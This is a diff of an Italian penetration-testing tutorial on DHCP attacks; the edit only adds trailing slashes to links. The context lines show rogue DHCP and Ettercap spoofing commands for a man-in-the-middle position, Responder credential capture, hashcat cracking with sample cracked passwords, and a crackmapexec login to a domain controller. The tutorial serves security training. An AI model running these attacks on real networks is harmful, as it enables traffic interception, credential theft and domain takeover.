@@ -58,7 +58,7 @@ Options: Variable (subnet mask, DNS, gateway, lease time, etc.)
 | Domain Name      | 15   | Domain suffix                                      | Recon: organization domain   |
 | Lease Time       | 51   | IP lease duration                                  | Starvation timing            |
 | DHCP Server ID   | 54   | Server IP                                          | Identify DHCP server         |
-| TFTP Server      | 66   | [TFTP](https://hackita.it/articoli/tftp) server IP | Config file leak vector      |
+| TFTP Server      | 66   | [TFTP](https://hackita.it/articoli/tftp/) server IP | Config file leak vector      |
 | WPAD             | 252  | Proxy auto-config                                  | **Responder WPAD attacks**   |
 
 Le **misconfigurazioni comuni**: no DHCP snooping (allow rogue DHCP), pool size troppo piccolo (DoS facile), lease time troppo lungo (starvation persistente), e options disclosure (TFTP server exposes config files).
@@ -165,7 +165,7 @@ systemctl start dnsmasq
 
 **Risultato:** Nuovi client DHCP ricevono gateway/DNS pointando all'attacker → tutto il traffico passa through attacker box → full MITM.
 
-**Capture credentials con [Responder](https://hackita.it/articoli/responder):**
+**Capture credentials con [Responder](https://hackita.it/articoli/responder/):**
 
 ```bash
 responder -I eth0 -wrf
@@ -202,7 +202,7 @@ atftpd --daemon --port 69 /tmp/tftp_root
 ### 4. DHCP ACK spoofing
 
 ```bash
-# Tool: [Ettercap](https://hackita.it/articoli/ettercap)
+# Tool: [Ettercap](https://hackita.it/articoli/ettercap/)
 ettercap -T -M dhcp:192.168.1.0/24/192.168.1.100-192.168.1.150/10.10.14.5
 # Pool: 192.168.1.100-150, Gateway spoofed: 10.10.14.5
 ```
@@ -237,7 +237,7 @@ wireshark dhcp_capture.pcap
 * **DNS Servers:** 192.168.10.10, 192.168.10.11 (Domain Controllers)
 * **Subnets:** Multiple VLAN options (Engineering: 192.168.20.0/24, Finance: 192.168.30.0/24)
 
-**Next steps:** Target Domain Controllers, map VLAN segmentation per [lateral movement](https://hackita.it/articoli/pivoting).
+**Next steps:** Target Domain Controllers, map VLAN segmentation per [lateral movement](https://hackita.it/articoli/pivoting/).
 
 ### Scenario 2 — Rogue DHCP MITM → credential harvest
 
@@ -264,7 +264,7 @@ tcpdump -i eth0 -w mitm_traffic.pcap
 ```
 
 ```bash
-# Fase 3: [Responder](https://hackita.it/articoli/responder) credential harvesting
+# Fase 3: [Responder](https://hackita.it/articoli/responder/) credential harvesting
 responder -I eth0 -wrf
 ```
 
@@ -275,7 +275,7 @@ responder -I eth0 -wrf
 ```
 
 ```bash
-# Fase 4: Crack hash con [hashcat](https://hackita.it/articoli/hashcat)
+# Fase 4: Crack hash con [hashcat](https://hackita.it/articoli/hashcat/)
 hashcat -m 5600 hash.txt rockyou.txt
 # jdoe:Password123!
 ```
@@ -330,7 +330,7 @@ RECONNAISSANCE (Passive)
 │
 ├─ tcpdump port 67/68                       → Network topology mapping
 ├─ Wireshark DHCP analysis                  → DHCP server, domain, DNS
-└─ [nmap](https://hackita.it/articoli/nmap) broadcast-dhcp-discover   → Active DHCP query
+└─ [nmap](https://hackita.it/articoli/nmap/) broadcast-dhcp-discover   → Active DHCP query
 
 ENUMERATION
 │
@@ -340,7 +340,7 @@ ENUMERATION
 
 EXPLOITATION
 │
-├─ A) Rogue DHCP → Gateway poison → MITM → [Responder](https://hackita.it/articoli/responder) creds
+├─ A) Rogue DHCP → Gateway poison → MITM → [Responder](https://hackita.it/articoli/responder/) creds
 ├─ B) DHCP starvation → DoS → rogue deployment
 ├─ C) Option injection → TFTP/WPAD poison → config leak/cred harvest
 └─ D) ACK spoofing → Faster response → gateway override
@@ -388,7 +388,7 @@ hashcat -m 5600 hashes.txt rockyou.txt
 # admin:Admin2024!
 
 [01:20] DOMAIN ACCESS
-[crackmapexec](https://hackita.it/articoli/crackmapexec) smb 10.10.10.10 -u admin -p Admin2024!
+[crackmapexec](https://hackita.it/articoli/crackmapexec/) smb 10.10.10.10 -u admin -p Admin2024!
 # [+] CORP\admin:Admin2024! (Pwn3d!)
 
 [01:25] DOMAIN ADMIN
